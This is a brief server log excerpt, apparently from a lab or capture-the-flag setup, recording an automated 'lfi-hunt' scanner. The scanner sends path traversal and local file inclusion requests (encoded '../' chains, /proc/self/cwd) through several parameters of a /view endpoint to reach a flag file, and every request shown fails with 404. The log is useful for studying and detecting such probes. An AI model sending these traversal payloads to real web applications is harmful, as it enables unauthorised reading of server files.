phpmyadmin-1  | 2025-10-14T20:40:32.392942031Z 10.11.202.14 - - [14/Oct/2025:20:40:32 +0000] "\n" 400 484 "-" "-"
server-1      | 2025-10-18T09:09:31.651957136Z 10.11.202.14 - - [18/Oct/2025:09:09:31 +0000] "GET /view?template=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fapp%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:31.654083276Z 10.11.202.14 - - [18/Oct/2025:09:09:31 +0000] "GET /view?template=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:31.656234880Z 10.11.202.14 - - [18/Oct/2025:09:09:31 +0000] "GET /view?tpl=%2Fapp%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:31.658550804Z 10.11.202.14 - - [18/Oct/2025:09:09:31 +0000] "GET /view?tpl=%2Fproc%2Fself%2Fcwd%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:31.661217763Z 10.11.202.14 - - [18/Oct/2025:09:09:31 +0000] "GET /view?tpl=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fapp%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:31.663547763Z 10.11.202.14 - - [18/Oct/2025:09:09:31 +0000] "GET /view?tpl=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:31.665697203Z 10.11.202.14 - - [18/Oct/2025:09:09:31 +0000] "GET /view?url=%2Fapp%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:31.667952531Z 10.11.202.14 - - [18/Oct/2025:09:09:31 +0000] "GET /view?url=%2Fproc%2Fself%2Fcwd%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:31.670163858Z 10.11.202.14 - - [18/Oct/2025:09:09:31 +0000] "GET /view?url=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fapp%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:31.672434888Z 10.11.202.14 - - [18/Oct/2025:09:09:31 +0000] "GET /view?url=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:31.674667408Z 10.11.202.14 - - [18/Oct/2025:09:09:31 +0000] "GET /view?u=%2Fapp%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:31.677053272Z 10.11.202.14 - - [18/Oct/2025:09:09:31 +0000] "GET /view?u=%2Fproc%2Fself%2Fcwd%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:31.679300716Z 10.11.202.14 - - [18/Oct/2025:09:09:31 +0000] "GET /view?u=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fapp%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:31.681996813Z 10.11.202.14 - - [18/Oct/2025:09:09:31 +0000] "GET /view?u=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:31.684600502Z 10.11.202.14 - - [18/Oct/2025:09:09:31 +0000] "GET /view?target=%2Fapp%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
